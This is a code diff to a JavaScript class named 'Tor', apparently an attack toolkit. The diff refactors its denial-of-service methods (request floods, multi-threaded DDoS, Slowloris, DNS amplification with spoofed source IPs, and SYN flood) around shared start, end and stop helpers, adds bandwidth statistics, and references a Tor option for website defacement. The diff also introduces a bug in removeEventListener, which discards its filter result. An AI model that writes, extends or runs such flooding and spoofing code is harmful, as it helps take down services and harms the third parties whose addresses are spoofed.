@@ -70,6 +70,12 @@ class Tor {
         this.errorCount = 0;
         this.rateLimitDelay = 2000;
         this.useTorForDeface = false;
+        this.attackStartTime = null;
+        this.attackEndTime = null;
+        this.activeAttackType = null;
+        this.targetURL = null;
+        this.attackConfig = {};
+        this.ddosThreads = [];
     }
 
     async initServerInfo() {
@@ -90,7 +96,24 @@ class Tor {
     }
 
     getRequestStats() {
-        return { ...this.requestStats };
+      const now = Date.now();
+      let duration = 0;
+      if (this.attackStartTime) {
+          duration = now - this.attackStartTime;
+      }
+
+        let mbpsSent = 0;
+        if (duration > 0) {
+            mbpsSent = ((this.requestStats.bytesSent * 8) / duration) / 1000000;
+        }
+        return {
+            ...this.requestStats,
+            mbpsSent: mbpsSent.toFixed(2),
+            attackDuration: duration,
+            attackType: this.activeAttackType,
+            targetURL: this.targetURL,
+            attackConfig: this.attackConfig
+        };
     }
 
     log(message, level = 'info') {
@@ -109,7 +132,7 @@ class Tor {
 
     removeEventListener(event, callback) {
         if (this.eventListeners[event]) {
-            this.eventListeners[event] = this.eventListeners[event].filter(cb => cb !== callback);
+            this.eventListeners[event].filter(cb => cb !== callback);
         }
     }
 
@@ -126,6 +149,7 @@ class Tor {
     enqueueRequest(url, options = {}, resolve, reject) {
         this.requestQueue.push({ url, options, resolve, reject });
         this.requestStats.sent++;
+        this.requestStats.bytesSent += options.body ? new TextEncoder().encode(options.body).length : 0;
         if (!this.isProcessingQueue) {
             this.processRequestQueue();
         }
@@ -534,11 +558,10 @@ class Tor {
     }
 
     async dosAttack(url, requestsPerSecond = 10, duration = 60) {
-        const startTime = Date.now();
-        const endTime = startTime + (duration * 1000);
-        let requestCount = 0;
+        this.startAttack('DOS', url, { requestsPerSecond, duration });
 
-        this.dispatchEvent('attackStart', { type: 'DOS', target: url, requestsPerSecond, duration });
+        const endTime = Date.now() + (duration * 1000);
+        let requestCount = 0;
 
         while (Date.now() < endTime) {
             for (let i = 0; i < requestsPerSecond; i++) {
@@ -557,15 +580,16 @@ class Tor {
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
 
-        this.dispatchEvent('attackEnd', { type: 'DOS', target: url, totalRequests: requestCount });
+        this.endAttack('DOS', url, { totalRequests: requestCount });
         console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
     }
 
     async ddosAttack(url, threads = 50, duration = 60) {
+        this.startAttack('DDOS', url, { threads, duration });
+        this.ddosThreads = [];
+
         const endTime = Date.now() + (duration * 1000);
         let requestCount = 0;
-
-        this.dispatchEvent('attackStart', { type: 'DDOS', target: url, threads, duration });
 
         const attackThread = async () => {
             while (Date.now() < endTime) {
@@ -581,22 +605,21 @@ class Tor {
             }
         };
 
-        const threadPromises = [];
         for (let i = 0; i < threads; i++) {
-            threadPromises.push(attackThread());
+            this.ddosThreads.push(attackThread());
         }
 
-        await Promise.all(threadPromises);
+        await Promise.all(this.ddosThreads);
 
-        this.dispatchEvent('attackEnd', { type: 'DDOS', target: url, totalRequests: requestCount, threads });
+        this.endAttack('DDOS', url, { totalRequests: requestCount, threads });
         console.log(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
     }
 
     async slowlorisAttack(url, sockets = 200, duration = 60) {
+        this.startAttack('Slowloris', url, { sockets, duration });
+
         const endTime = Date.now() + (duration * 1000);
         let socketCount = 0;
-
-        this.dispatchEvent('attackStart', { type: 'Slowloris', target: url, sockets, duration });
 
         const sendKeepAlive = async (socket) => {
             try {
@@ -643,8 +666,8 @@ class Tor {
         console.log(`Slowloris attack started with ${sockets} sockets.`);
         this.dispatchEvent('log', { message: `Slowloris attack started with ${sockets} sockets.`, level: 'info' });
         await new Promise(resolve => setTimeout(resolve, duration * 1000));
+        this.endAttack('Slowloris', url, { sockets });
         console.log('Slowloris attack completed.');
-        this.dispatchEvent('attackEnd', { type: 'Slowloris', target: url, sockets });
     }
 
     async collectHoneypotData(url) {
@@ -686,28 +709,28 @@ class Tor {
     }
 
     async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
-        const endTime = Date.now() + (duration * 1000);
-        let packetCount = 0;
+      this.startAttack('DNS Amplification', targetIP, { spoofIP, packetsPerSecond, duration });
 
-        this.dispatchEvent('attackStart', { type: 'DNS Amplification', target: targetIP, spoofIP, packetsPerSecond, duration });
+      const endTime = Date.now() + (duration * 1000);
+      let packetCount = 0;
 
-        while (Date.now() < endTime) {
-            for (let i = 0; i < packetsPerSecond; i++) {
-                try {
-                    const dnsQuery = this.createDNSQuery();
-                    const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
-                    await this.sendPacket(spoofedPacket, targetIP);
-                    packetCount++;
-                } catch (error) {
-                    this.log(`DNS Amplification error: ${error}`, 'error');
-                }
-            }
-            await new Promise(resolve => setTimeout(resolve, 1000));
-        }
+      while (Date.now() < endTime) {
+          for (let i = 0; i < packetsPerSecond; i++) {
+              try {
+                  const dnsQuery = this.createDNSQuery();
+                  const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
+                  await this.sendPacket(spoofedPacket, targetIP);
+                  packetCount++;
+              } catch (error) {
+                  this.log(`DNS Amplification error: ${error}`, 'error');
+              }
+          }
+          await new Promise(resolve => setTimeout(resolve, 1000));
+      }
 
-        this.dispatchEvent('attackEnd', { type: 'DNS Amplification', target: targetIP, totalPackets: packetCount });
-        console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
-    }
+      this.endAttack('DNS Amplification', targetIP, { totalPackets: packetCount });
+      console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
+  }
 
     createDNSQuery() {
         const queryId = Math.floor(Math.random() * 65535);
@@ -753,27 +776,27 @@ class Tor {
     }
 
     async synFloodAttack(targetIP, targetPort = 80, packetsPerSecond = 1000, duration = 60) {
-        const endTime = Date.now() + (duration * 1000);
-        let packetCount = 0;
+      this.startAttack('SYN Flood', targetIP, { targetPort, packetsPerSecond, duration });
 
-        this.dispatchEvent('attackStart', { type: 'SYN Flood', target: targetIP, targetPort, packetsPerSecond, duration });
+      const endTime = Date.now() + (duration * 1000);
+      let packetCount = 0;
 
-        while (Date.now() < endTime) {
-            for (let i = 0; i < packetsPerSecond; i++) {
-                try {
-                    const synPacket = this.createSynPacket(targetIP, targetPort);
-                    await this.sendRawPacket(synPacket, targetIP, targetPort);
-                    packetCount++;
-                } catch (error) {
-                    this.log(`SYN Flood error: ${error}`, 'error');
-                }
-            }
-            await new Promise(resolve => setTimeout(resolve, 1000));
-        }
+      while (Date.now() < endTime) {
+          for (let i = 0; i < packetsPerSecond; i++) {
+              try {
+                  const synPacket = this.createSynPacket(targetIP, targetPort);
+                  await this.sendRawPacket(synPacket, targetIP, targetPort);
+                  packetCount++;
+              } catch (error) {
+                  this.log(`SYN Flood error: ${error}`, 'error');
+              }
+          }
+          await new Promise(resolve => setTimeout(resolve, 1000));
+      }
 
-        this.dispatchEvent('attackEnd', { type: 'SYN Flood', target: targetIP, targetPort, totalPackets: packetCount });
-        console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
-    }
+      this.endAttack('SYN Flood', targetIP, { totalPackets: packetCount });
+      console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
+  }
 
     createSynPacket(targetIP, targetPort) {
         return {
@@ -817,6 +840,43 @@ class Tor {
     setUseTorForDeface(useTor) {
       this.useTorForDeface = useTor;
       this.log(`Use Tor for deface set to: ${useTor}`, 'info');
+    }
+
+    startAttack(attackType, targetURL, config = {}) {
+        this.activeAttackType = attackType;
+        this.targetURL = targetURL;
+        this.attackConfig = config;
+        this.attackStartTime = Date.now();
+        this.attackEndTime = null;
+        this.requestStats = {
+            sent: 0,
+            success: 0,
+            failed: 0,
+            bytesSent: 0,
+            bytesReceived: 0
+        };
+
+        this.dispatchEvent('attackStart', { type: attackType, target: targetURL, config: config });
+        this.log(`${attackType} attack started on ${targetURL}`, 'info');
+    }
+
+    endAttack(attackType, targetURL, results = {}) {
+        this.attackEndTime = Date.now();
+        this.activeAttackType = null;
+        this.targetURL = null;
+        this.attackConfig = {};
+        this.dispatchEvent('attackEnd', { type: attackType, target: targetURL, results: results });
+        this.log(`${attackType} attack ended on ${targetURL}`, 'info');
+        this.ddosThreads = [];
+    }
+
+    stopAttack() {
+        if (this.activeAttackType) {
+            this.endAttack(this.activeAttackType, this.targetURL);
+            this.log('Attack stopped manually.', 'info');
+        } else {
+            this.log('No active attack to stop.', 'warn');
+        }
     }
 }
 
